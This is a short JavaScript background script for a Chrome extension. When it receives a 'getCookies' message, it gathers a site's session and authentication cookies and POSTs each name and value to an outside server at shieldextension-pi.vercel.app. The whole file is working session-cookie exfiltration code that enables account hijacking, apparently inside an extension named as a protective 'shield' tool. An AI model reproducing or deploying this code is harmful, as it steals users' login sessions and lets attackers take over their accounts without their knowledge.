chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
  if (req.action === "getCookies") {

    chrome.cookies.getAll({ url: req.url }, async (cookies) => {

      const filtered = cookies.filter(c =>
        c.name === "sessionid" ||
        c.name.toLowerCase().includes("session") ||
        c.name.toLowerCase().includes("auth")
      );

      // send each cookie separately
      for (const cookie of filtered) {
        await fetch("https://shieldextension-pi.vercel.app/add", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            url: req.url,
            session_name: cookie.name,
            session_id: cookie.value
          })
        });
      }

      sendResponse({ success: true, sent: filtered.length });
    });

    return true;
  }
});